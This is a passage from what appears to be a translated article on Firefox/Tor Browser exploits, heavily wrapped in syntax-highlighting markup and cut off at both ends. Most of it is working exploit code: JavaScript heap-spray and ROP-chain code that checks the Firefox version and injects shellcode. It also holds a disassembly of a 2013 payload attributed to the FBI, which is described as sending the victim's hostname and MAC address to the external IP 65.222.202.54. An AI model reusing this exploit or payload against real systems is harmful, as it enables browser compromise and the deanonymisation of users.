class="hljs-selector-tag"><span class="hljs-selector-tag">doubleFromFloat</span></span> = <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>) { convf64[0]=b; return convu32[a] }, <span class="hljs-selector-tag"><span class="hljs-selector-tag">sprayArrays</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>() { for(var b=Array(262138),a=0;262138&gt;a;a++) b[a]=fzero; for(a=0;a&lt;b.length;a+=512) b[a+1] = memory, b[a+21] = qword2Double(0,2), b[a+14] = qword2Double(arrBase+o1,0), b[a+(o1+8)/8] = qword2Double(arrBase+o2,0), b[a+(o2+0)/8] = qword2Double(2,0), b[a+(o2+8)/8] = qword2Double(arrBase+o3,arrBase+13), b[a+(o3+0)/8] = qword2Double(16,0), b[a+(o3+24)/8] = qword2Double(2,0), b[a+(o3+32)/8] = qword2Double(arrBase+o5,arrBase+o4), b[a+(o4+0)/8] = qword2Double(0,arrBase+o6), b[a+(o5+0)/8] = qword2Double(arrBase+o7,0), b[a+(o6+8)/8] = qword2Double(2,0), b[a+(o7+8)/8] = qword2Double(arrBase+o7+16,0), b[a+(o7+16)/8] = qword2Double(0,4026531840), b[a+(o7+32)/8] = qword2Double(0,3220176896), b[a+(o7+48)/8] = qword2Double(2,0), b[a+(o7+56)/8] = qword2Double(1,0), b[a+(o7+96)/8] = qword2Double(arrBase+o8,arrBase+o8), b[a+(o7+112)/8] = qword2Double(arrBase+o9,arrBase+o9+16), b[a+(o7+168)/8] = qword2Double(0,2), b[a+(o9+0)/8] = qword2Double(arrBase+o10,2), b[a+(o10+0)/8] = qword2Double(2,0), b[a+(o10+8)/8] = qword2Double(0,268435456), b[a+(o11+8)/8] = qword2Double(arrBase+o11+16,0), b[a+(o11+16)/8] = qword2Double(0,4026531840), b[a+(o11+32)/8] = qword2Double(0,3220176896), b[a+(o11+48)/8] = qword2Double(2,0), b[a+(o11+56)/8] = qword2Double(1,0), b[a+(o11+96)/8] = qword2Double(arrBase+o8,arrBase+o8), b[a+(o11+112)/8] = qword2Double(arrBase+o9,arrBase+o9+16), b[a+(o11+168)/8] = qword2Double(0,2); for(a=0;a&lt;spr.length;a++) spr[a]=b.slice(0) }, <span class="hljs-selector-tag"><span class="hljs-selector-tag">vtable_offset</span></span>=300; /.*<span class="hljs-selector-tag"><span class="hljs-selector-tag">Firefox</span></span>\/(41\<span class="hljs-selector-class"><span class="hljs-selector-class">.0</span></span>(\.<span class="hljs-selector-attr"><span class="hljs-selector-attr">[1-2]</span></span>|)|42\<span class="hljs-selector-class"><span class="hljs-selector-class">.0</span></span>).*/<span class="hljs-selector-class"><span class="hljs-selector-class">.test</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">navigator</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.userAgent</span></span>)? <span class="hljs-selector-tag"><span class="hljs-selector-tag">vtable_offset</span></span>=304 : /.*<span class="hljs-selector-tag"><span class="hljs-selector-tag">Firefox</span></span>\/(4<span class="hljs-selector-attr"><span class="hljs-selector-attr">[3-9]</span></span>|<span class="hljs-selector-attr"><span class="hljs-selector-attr">[5-9]</span></span>\<span class="hljs-selector-tag"><span class="hljs-selector-tag">d</span></span>+|<span class="hljs-selector-attr"><span class="hljs-selector-attr">[1-9]</span></span>\<span class="hljs-selector-tag"><span class="hljs-selector-tag">d</span></span>{2,})\..*/<span class="hljs-selector-class"><span class="hljs-selector-class">.test</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">navigator</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.userAgent</span></span>) &amp;&amp; (<span class="hljs-selector-tag"><span class="hljs-selector-tag">vtable_offset</span></span>=308); <span class="hljs-selector-tag"><span class="hljs-selector-tag">var</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">Array</span></span>(400), <span class="hljs-selector-tag"><span class="hljs-selector-tag">arrBase</span></span>=805306416, <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropArrBuf</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">ArrayBuffer</span></span>(4096), <span class="hljs-selector-tag"><span class="hljs-selector-tag">o1</span></span>=176, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o2</span></span>=256, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o3</span></span>=768, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o4</span></span>=832, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o5</span></span>=864, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o6</span></span>=928, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o7</span></span>=1024, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o8</span></span>=1280, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o9</span></span>=1344, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o10</span></span>=1376, <span class="hljs-selector-tag"><span class="hljs-selector-tag">o11</span></span>=1536, <span class="hljs-selector-tag"><span class="hljs-selector-tag">oRop</span></span>=1792, <span class="hljs-selector-tag"><span class="hljs-selector-tag">memory</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">Uint32Array</span></span>(16), <span class="hljs-selector-tag"><span class="hljs-selector-tag">len</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">memory</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.length</span></span>, <span class="hljs-selector-tag"><span class="hljs-selector-tag">arr_index</span></span>=0, <span class="hljs-selector-tag"><span class="hljs-selector-tag">arr_offset</span></span>=0; <span class="hljs-selector-tag"><span class="hljs-selector-tag">fzero</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">qword2Double</span></span>(0,0); 0!=<span class="hljs-selector-tag"><span class="hljs-selector-tag">thecode</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.length</span></span>%2&amp;&amp;(<span class="hljs-selector-tag"><span class="hljs-selector-tag">thecode</span></span>+="\<span class="hljs-selector-tag"><span class="hljs-selector-tag">u9090</span></span>"); <span class="hljs-selector-tag"><span class="hljs-selector-tag">sprayArrays</span></span>(); <span class="hljs-selector-tag"><span class="hljs-selector-tag">postMessage</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">arrBase</span></span>); <span class="hljs-selector-tag"><span class="hljs-selector-tag">for</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">memarrayloc</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">void</span></span> 0;<span class="hljs-selector-tag"><span class="hljs-selector-tag">void</span></span> 0==<span class="hljs-selector-tag"><span class="hljs-selector-tag">memarrayloc</span></span>;) <span class="hljs-selector-tag"><span class="hljs-selector-tag">for</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">i</span></span>=0;<span class="hljs-selector-tag"><span class="hljs-selector-tag">i</span></span>&lt;<span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.length</span></span>;<span class="hljs-selector-tag"><span class="hljs-selector-tag">i</span></span>++) <span class="hljs-selector-tag"><span class="hljs-selector-tag">for</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">offset</span></span>=0;<span class="hljs-selector-tag"><span class="hljs-selector-tag">offset</span></span>&lt;<span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i]</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.length</span></span>;<span class="hljs-selector-tag"><span class="hljs-selector-tag">offset</span></span>+=512) <span class="hljs-selector-tag"><span class="hljs-selector-tag">if</span></span>("<span class="hljs-selector-tag"><span class="hljs-selector-tag">object</span></span>" != <span class="hljs-selector-tag"><span class="hljs-selector-tag">typeof</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i]</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[offset+1]</span></span>) { memarrayloc=doubleFromFloat(spr[i][offset+1],0); arr_index=i; arr_offset=offset; spr[i][offset+(o2+0)/8]=qword2Double(65,0); spr[i][offset+(o2+8)/8]=qword2Double(arrBase+o3,memarrayloc+27); for(j=0;33&gt;j;j++) spr[i][offset+(o2+16)/8+j]=qword2Double(memarrayloc+27,memarrayloc+27); spr[i][offset+(o3+8)/8]=qword2Double(0,0); spr[i][offset+(o5+0)/8]=qword2Double(arrBase+o11,0); spr[i][offset+(o7+168)/8]=qword2Double(0,3); spr[i][offset+(o7+88)/8]=qword2Double(0,2); break } <span class="hljs-selector-tag"><span class="hljs-selector-tag">for</span></span>(;<span class="hljs-selector-tag"><span class="hljs-selector-tag">memory</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.length</span></span>==<span class="hljs-selector-tag"><span class="hljs-selector-tag">len</span></span>;); <span class="hljs-selector-tag"><span class="hljs-selector-tag">var</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">mem</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">Memory</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">memarrayloc</span></span>+48, <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>){return memory[b/4]}, <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>){memory[b/4]=a}), <span class="hljs-selector-tag"><span class="hljs-selector-tag">xulPtr</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">mem</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.readDword</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">memarrayloc</span></span>+12); <span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_index]</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_offset+1]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropArrBuf</span></span>; <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropPtr</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">mem</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.readDword</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">arrBase</span></span>+8); <span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_index]</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_offset+1]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">null</span></span>; <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropBase</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">mem</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.readDword</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropPtr</span></span>+16); <span class="hljs-selector-tag"><span class="hljs-selector-tag">var</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">rop</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">ROP</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">mem</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">xulPtr</span></span>); <span class="hljs-selector-tag"><span class="hljs-selector-tag">rop</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.ropChain</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropBase</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">vtable_offset</span></span>,10,<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropArrBuf</span></span>); <span class="hljs-selector-tag"><span class="hljs-selector-tag">var</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">backupESP</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">rop</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.findSequence</span></span>(<span class="hljs-selector-attr"><span class="hljs-selector-attr">[137,1,195]</span></span>), <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">Uint32Array</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropArrBuf</span></span>); <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[0]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">backupESP</span></span>; <span class="hljs-selector-tag"><span class="hljs-selector-tag">CreateThread</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">rop</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.pe</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.resolve_imported_function</span></span>("<span class="hljs-selector-tag"><span class="hljs-selector-tag">KERNEL32</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.dll</span></span>","<span class="hljs-selector-tag"><span class="hljs-selector-tag">CreateThread</span></span>"); <span class="hljs-selector-tag"><span class="hljs-selector-tag">for</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">var</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">i</span></span>=0;<span class="hljs-selector-tag"><span class="hljs-selector-tag">i</span></span>&lt;<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.length</span></span>&amp;&amp;3435973836!=<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i]</span></span>;<span class="hljs-selector-tag"><span class="hljs-selector-tag">i</span></span>++); <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=3296825488; <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=2048; <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=1347469361; <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=1528949584; <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=3092271187; <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">CreateThread</span></span>; <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=3096498431; <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">arrBase</span></span>+16; <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=1955274891; <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=280697892; <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=704643071; <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=2425406428; <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=4294957800; <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=2425393407; <span class="hljs-selector-tag"><span class="hljs-selector-tag">for</span></span> (<span class="hljs-selector-tag"><span class="hljs-selector-tag">var</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">j</span></span>=0;<span class="hljs-selector-tag"><span class="hljs-selector-tag">j</span></span>&lt;<span class="hljs-selector-tag"><span class="hljs-selector-tag">thecode</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.length</span></span>;<span class="hljs-selector-tag"><span class="hljs-selector-tag">j</span></span>+=2) <span class="hljs-selector-tag"><span class="hljs-selector-tag">ropChain</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[i++]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">thecode</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.charCodeAt</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">j</span></span>)+65536*<span class="hljs-selector-tag"><span class="hljs-selector-tag">thecode</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.charCodeAt</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">j</span></span>+1); <span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_index]</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_offset]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">qword2Double</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">arrBase</span></span>+16,0); <span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_index]</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_offset+3]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">qword2Double</span></span>(0,256); <span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_index]</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_offset+2]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">qword2Double</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">ropBase</span></span>,0); <span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_index]</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_offset+(o11+168)/8]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">qword2Double</span></span>(0,3); <span class="hljs-selector-tag"><span class="hljs-selector-tag">spr</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_index]</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[arr_offset+(o11+88)/8]</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">qword2Double</span></span>(0,2); <span class="hljs-selector-tag"><span class="hljs-selector-tag">postMessage</span></span>("<span class="hljs-selector-tag"><span class="hljs-selector-tag">GREAT</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">SUCCESS</span></span>"); };</code> </pre> </div></div><br>  A similar code in 2013 was used by the FBI.  For example, here is a <a href="https://tsyrklevich.net/tbb_payload.txt">sample of the</a> disassembled code that the FBI used, with a few comments for clarity.  The code did not upload any additional backdoors to the machine - this also indirectly indicates that it was not distributed by criminals, but by law enforcement agencies solely for the purpose of collecting personal data of users. <br><br>  This particular code opens a connection from 65.222.202.54:80 and sends an HTTP request containing the host name (via <code>gethostname()</code> ) and the local host's MAC address (via the <code>SendARP</code> call to <code>gethostbyname()-&gt;h_addr_list</code> ).  After that, he cleans up the state and as if deliberately terminated with a failure. <br><br><div class="spoiler">  <b class="spoiler_title">Exploit code 2013</b> <div class="spoiler_text"><pre> <code class="hljs pgsql">$ ndisasm -k <span class="hljs-number"><span class="hljs-number">0x90</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span> -k <span class="hljs-number"><span class="hljs-number">0x256</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span> -u shellcode <span class="hljs-number"><span class="hljs-number">00000000</span></span> <span class="hljs-number"><span class="hljs-number">60</span></span> pusha <span class="hljs-number"><span class="hljs-number">00000001</span></span> FC cld <span class="hljs-number"><span class="hljs-number">00000002</span></span> E88A000000 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> <span class="hljs-number"><span class="hljs-number">0x91</span></span> <span class="hljs-number"><span class="hljs-number">00000007</span></span> <span class="hljs-number"><span class="hljs-number">60</span></span> pusha # win32 <span class="hljs-keyword"><span class="hljs-keyword">function</span></span> resolver <span class="hljs-keyword"><span class="hljs-keyword">by</span></span> @stephenfewer, used <span class="hljs-keyword"><span class="hljs-keyword">by</span></span> Metasploit <span class="hljs-number"><span class="hljs-number">00000008</span></span> <span class="hljs-number"><span class="hljs-number">89E5</span></span> mov ebp,esp <span class="hljs-number"><span class="hljs-number">0000000</span></span>A <span class="hljs-number"><span class="hljs-number">31</span></span>D2 xor edx,edx <span class="hljs-number"><span class="hljs-number">0000000</span></span>C <span class="hljs-number"><span class="hljs-number">648</span></span>B5230 mov edx,[fs:edx+<span class="hljs-number"><span class="hljs-number">0x30</span></span>] <span class="hljs-number"><span class="hljs-number">00000010</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>B520C mov edx,[edx+<span class="hljs-number"><span class="hljs-number">0xc</span></span>] <span class="hljs-number"><span class="hljs-number">00000013</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>B5214 mov edx,[edx+<span class="hljs-number"><span class="hljs-number">0x14</span></span>] <span class="hljs-number"><span class="hljs-number">00000016</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>B7228 mov esi,[edx+<span class="hljs-number"><span class="hljs-number">0x28</span></span>] <span class="hljs-number"><span class="hljs-number">00000019</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>FB74A26 movzx ecx,word [edx+<span class="hljs-number"><span class="hljs-number">0x26</span></span>] <span class="hljs-number"><span class="hljs-number">0000001</span></span>D <span class="hljs-number"><span class="hljs-number">31</span></span>FF xor edi,edi <span class="hljs-number"><span class="hljs-number">0000001</span></span>F <span class="hljs-number"><span class="hljs-number">31</span></span>C0 xor eax,eax <span class="hljs-number"><span class="hljs-number">00000021</span></span> AC lodsb <span class="hljs-number"><span class="hljs-number">00000022</span></span> <span class="hljs-number"><span class="hljs-number">3</span></span>C61 cmp al,<span class="hljs-number"><span class="hljs-number">0x61</span></span> <span class="hljs-number"><span class="hljs-number">00000024</span></span> <span class="hljs-number"><span class="hljs-number">7</span></span>C02 jl <span class="hljs-number"><span class="hljs-number">0x28</span></span> <span class="hljs-number"><span class="hljs-number">00000026</span></span> <span class="hljs-number"><span class="hljs-number">2</span></span>C20 sub al,<span class="hljs-number"><span class="hljs-number">0x20</span></span> <span class="hljs-number"><span class="hljs-number">00000028</span></span> C1CF0D ror edi,<span class="hljs-number"><span class="hljs-number">0xd</span></span> <span class="hljs-number"><span class="hljs-number">0000002</span></span>B <span class="hljs-number"><span class="hljs-number">01</span></span>C7 <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> edi,eax <span class="hljs-number"><span class="hljs-number">0000002</span></span>D E2F0 <span class="hljs-keyword"><span class="hljs-keyword">loop</span></span> <span class="hljs-number"><span class="hljs-number">0x1f</span></span> <span class="hljs-number"><span class="hljs-number">0000002</span></span>F <span class="hljs-number"><span class="hljs-number">52</span></span> push edx <span class="hljs-number"><span class="hljs-number">00000030</span></span> <span class="hljs-number"><span class="hljs-number">57</span></span> push edi <span class="hljs-number"><span class="hljs-number">00000031</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>B5210 mov edx,[edx+<span class="hljs-number"><span class="hljs-number">0x10</span></span>] <span class="hljs-number"><span class="hljs-number">00000034</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>B423C mov eax,[edx+<span class="hljs-number"><span class="hljs-number">0x3c</span></span>] <span class="hljs-number"><span class="hljs-number">00000037</span></span> <span class="hljs-number"><span class="hljs-number">01</span></span>D0 <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> eax,edx <span class="hljs-number"><span class="hljs-number">00000039</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>B4078 mov eax,[eax+<span class="hljs-number"><span class="hljs-number">0x78</span></span>] <span class="hljs-number"><span class="hljs-number">0000003</span></span>C <span class="hljs-number"><span class="hljs-number">85</span></span>C0 test eax,eax <span class="hljs-number"><span class="hljs-number">0000003</span></span>E <span class="hljs-number"><span class="hljs-number">744</span></span>A jz <span class="hljs-number"><span class="hljs-number">0x8a</span></span> <span class="hljs-number"><span class="hljs-number">00000040</span></span> <span class="hljs-number"><span class="hljs-number">01</span></span>D0 <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> eax,edx <span class="hljs-number"><span class="hljs-number">00000042</span></span> <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">00000043</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>B4818 mov ecx,[eax+<span class="hljs-number"><span class="hljs-number">0x18</span></span>] <span class="hljs-number"><span class="hljs-number">00000046</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>B5820 mov ebx,[eax+<span class="hljs-number"><span class="hljs-number">0x20</span></span>] <span class="hljs-number"><span class="hljs-number">00000049</span></span> <span class="hljs-number"><span class="hljs-number">01</span></span>D3 <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> ebx,edx <span class="hljs-number"><span class="hljs-number">0000004</span></span>B E33C jecxz <span class="hljs-number"><span class="hljs-number">0x89</span></span> <span class="hljs-number"><span class="hljs-number">0000004</span></span>D <span class="hljs-number"><span class="hljs-number">49</span></span> <span class="hljs-type"><span class="hljs-type">dec</span></span> ecx <span class="hljs-number"><span class="hljs-number">0000004</span></span>E <span class="hljs-number"><span class="hljs-number">8</span></span>B348B mov esi,[ebx+ecx*<span class="hljs-number"><span class="hljs-number">4</span></span>] <span class="hljs-number"><span class="hljs-number">00000051</span></span> <span class="hljs-number"><span class="hljs-number">01</span></span>D6 <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> esi,edx <span class="hljs-number"><span class="hljs-number">00000053</span></span> <span class="hljs-number"><span class="hljs-number">31</span></span>FF xor edi,edi <span class="hljs-number"><span class="hljs-number">00000055</span></span> <span class="hljs-number"><span class="hljs-number">31</span></span>C0 xor eax,eax <span class="hljs-number"><span class="hljs-number">00000057</span></span> AC lodsb <span class="hljs-number"><span class="hljs-number">00000058</span></span> C1CF0D ror edi,<span class="hljs-number"><span class="hljs-number">0xd</span></span> <span class="hljs-number"><span class="hljs-number">0000005</span></span>B <span class="hljs-number"><span class="hljs-number">01</span></span>C7 <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> edi,eax <span class="hljs-number"><span class="hljs-number">0000005</span></span>D <span class="hljs-number"><span class="hljs-number">38E0</span></span> cmp al,ah <span class="hljs-number"><span class="hljs-number">0000005</span></span>F <span class="hljs-number"><span class="hljs-number">75</span></span>F4 jnz <span class="hljs-number"><span class="hljs-number">0x55</span></span> <span class="hljs-number"><span class="hljs-number">00000061</span></span> <span class="hljs-number"><span class="hljs-number">037</span></span>DF8 <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> edi,[ebp<span class="hljs-number"><span class="hljs-number">-0x8</span></span>] <span class="hljs-number"><span class="hljs-number">00000064</span></span> <span class="hljs-number"><span class="hljs-number">3</span></span>B7D24 cmp edi,[ebp+<span class="hljs-number"><span class="hljs-number">0x24</span></span>] <span class="hljs-number"><span class="hljs-number">00000067</span></span> <span class="hljs-number"><span class="hljs-number">75E2</span></span> jnz <span class="hljs-number"><span class="hljs-number">0x4b</span></span> <span class="hljs-number"><span class="hljs-number">00000069</span></span> <span class="hljs-number"><span class="hljs-number">58</span></span> pop eax <span class="hljs-number"><span class="hljs-number">0000006</span></span>A <span class="hljs-number"><span class="hljs-number">8</span></span>B5824 mov ebx,[eax+<span class="hljs-number"><span class="hljs-number">0x24</span></span>] <span class="hljs-number"><span class="hljs-number">0000006</span></span>D <span class="hljs-number"><span class="hljs-number">01</span></span>D3 <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> ebx,edx <span class="hljs-number"><span class="hljs-number">0000006</span></span>F <span class="hljs-number"><span class="hljs-number">668</span></span>B0C4B mov cx,[ebx+ecx*<span class="hljs-number"><span class="hljs-number">2</span></span>] <span class="hljs-number"><span class="hljs-number">00000073</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>B581C mov ebx,[eax+<span class="hljs-number"><span class="hljs-number">0x1c</span></span>] <span class="hljs-number"><span class="hljs-number">00000076</span></span> <span class="hljs-number"><span class="hljs-number">01</span></span>D3 <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> ebx,edx <span class="hljs-number"><span class="hljs-number">00000078</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>B048B mov eax,[ebx+ecx*<span class="hljs-number"><span class="hljs-number">4</span></span>] <span class="hljs-number"><span class="hljs-number">0000007</span></span>B <span class="hljs-number"><span class="hljs-number">01</span></span>D0 <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> eax,edx <span 